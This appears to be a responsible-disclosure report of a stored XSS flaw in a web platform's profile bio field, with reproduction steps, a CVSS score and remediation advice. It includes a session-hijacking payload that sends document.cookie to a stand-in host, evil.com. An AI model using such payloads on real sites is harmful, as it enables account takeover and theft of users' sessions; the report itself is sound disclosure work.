Hi,

I found a Stored Cross-Site Scripting (XSS) vulnerability in the user profile
bio field on your platform. This allows any authenticated user to inject
malicious JavaScript that executes in the browser of every visitor who views
that profile.

## Vulnerability Details

**Type:** Stored XSS
**Location:** User Profile → Bio field (POST /api/profile)
**Affected Page:** GET /profile/{username}
**Severity:** HIGH
**CVSS Score:** 8.2 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)

## Steps to Reproduce

1. Log in to any account at https://app.targetcompany.com
2. Navigate to Settings → Edit Profile
3. In the Bio field, enter the following payload:
   <script>alert(1)</script>
4. Click Save Profile
5. Log out and visit your profile URL as a different user or in a private window
6. The alert box fires, confirming JavaScript execution in the victim's browser

## Extended Payload (Session Hijacking)

A real attacker could replace alert(1) with:
   <script>fetch('https://evil.com/steal?c='+document.cookie)</script>

This would silently exfiltrate the victim's session cookie to an attacker-controlled server.

## Root Cause

The profile bio is stored as raw HTML in the database and rendered without
sanitisation into the page template. There is no Content Security Policy (CSP)
header in place to mitigate the risk.

## Impact

- Full account takeover of any user who views an infected profile
- Credential theft, session hijacking, CSRF bypass
- Can escalate to admin compromise if an admin views the profile

## Recommended Remediation

1. HTML-encode all user-supplied content before rendering:
   Use a library like DOMPurify (JS) or bleach (Python) to sanitise bio input
2. Implement a strict Content-Security-Policy header:
   Content-Security-Policy: default-src 'self'; script-src 'self'
3. Validate and restrict allowed characters in bio fields server-side

